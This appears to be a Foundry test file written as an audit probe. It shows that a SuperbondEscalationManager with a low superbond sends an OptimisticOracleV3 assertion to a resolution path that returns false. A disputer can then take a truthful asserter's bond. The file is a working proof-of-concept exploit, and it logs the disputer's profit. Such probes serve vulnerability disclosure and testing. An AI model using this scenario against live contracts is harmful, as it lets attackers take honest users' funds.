// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.16;

import "forge-std/Test.sol";
import "../../src/optimistic-oracle-v3/implementation/OptimisticOracleV3.sol";
import "../../src/optimistic-oracle-v3/implementation/escalation-manager/SuperbondEscalationManager.sol";
import "../../src/data-verification-mechanism/implementation/Constants.sol";
import "./Mocks.sol";

// Probe: SuperbondEscalationManager switches an assertion to escalation-manager arbitration once its bond exceeds
// `superbond`, but the manager does not implement getPrice(). Any such assertion therefore cannot be settled via the
// EM (getPrice returns the zero value, i.e. "false"), which resolves the assertion against the asserter.
contract SuperbondEscalationAttacks is Test {
    OptimisticOracleV3 oo;
    MockFinder finder;
    MockStore store;
    MockIdentifierWhitelist idWhitelist;
    AddressWhitelist collateralWhitelist;
    MockOracle oracle;
    TestERC20 currency;

    SuperbondEscalationManager em;

    address asserter = address(0xA11CE);
    address disputer = address(0xB0B);

    bytes32 constant IDENT = "ASSERT_TRUTH";
    uint64 constant LIVENESS = 7200;
    uint256 constant FINAL_FEE = 1000e6;

    function setUp() public {
        vm.warp(1_700_000_000);
        currency = new TestERC20("Test USD", "TUSD");
        finder = new MockFinder();
        store = new MockStore();
        idWhitelist = new MockIdentifierWhitelist();
        collateralWhitelist = new AddressWhitelist();
        oracle = new MockOracle();

        collateralWhitelist.addToWhitelist(address(currency));
        idWhitelist.setSupported(IDENT, true);
        store.setFinalFee(address(currency), FINAL_FEE);

        finder.changeImplementationAddress(OracleInterfaces.Oracle, address(oracle));
        finder.changeImplementationAddress(OracleInterfaces.Store, address(store));
        finder.changeImplementationAddress(OracleInterfaces.IdentifierWhitelist, address(idWhitelist));
        finder.changeImplementationAddress(OracleInterfaces.CollateralWhitelist, address(collateralWhitelist));

        oo = new OptimisticOracleV3(finder, IERC20(address(currency)), LIVENESS);
        em = new SuperbondEscalationManager(address(oo));

        currency.mint(asserter, 1_000_000e6);
        currency.mint(disputer, 1_000_000e6);
        vm.prank(asserter);
        currency.approve(address(oo), type(uint256).max);
        vm.prank(disputer);
        currency.approve(address(oo), type(uint256).max);
    }

    // A bond above `superbond` flips arbitration to the escalation manager. Because SuperbondEscalationManager does not
    // implement getPrice(), the assertion cannot be settled through the EM path at all.
    function test_superbondArbitrationHasNoPriceImplementation() public {
        em.setSuperbond(1e6); // very low superbond
        em.setSuperbondCurrency(address(currency));

        uint256 bond = oo.getMinimumBond(address(currency)); // 2e9 > 1e6 -> arbitrate via EM
        uint256 asserterInitial = currency.balanceOf(asserter);
        uint256 disputerInitial = currency.balanceOf(disputer);
        vm.prank(asserter);
        bytes32 id = oo.assertTruth("true claim", asserter, address(0), address(em), LIVENESS, IERC20(address(currency)), bond, IDENT, bytes32(0));

        OptimisticOracleV3Interface.Assertion memory a = oo.getAssertion(id);
        assertTrue(a.escalationManagerSettings.arbitrateViaEscalationManager, "should arbitrate via EM");

        vm.prank(disputer);
        oo.disputeAssertion(id, disputer);

        // The EM has no getPrice implementation. BaseEscalationManager.getPrice() returns the zero value without a
        // stored resolution, so the assertion resolves as false regardless of the truth of the claim.
        oo.settleAssertion(id);
        assertFalse(oo.getAssertionResult(id), "true assertion silently resolved false");

        // Economic impact: the truthful asserter loses its bond (minus the burned fee) to the disputer.
        uint256 asserterFinal = currency.balanceOf(asserter);
        uint256 disputerFinal = currency.balanceOf(disputer);
        assertLt(asserterFinal, asserterInitial, "asserter must lose bond");
        assertGt(disputerFinal, disputerInitial, "disputer must profit from an undisputable-true claim");
        emit log_named_uint("bond", bond);
        emit log_named_uint("asserter delta", asserterInitial - asserterFinal);
        emit log_named_uint("disputer profit", disputerFinal - disputerInitial);
    }
}
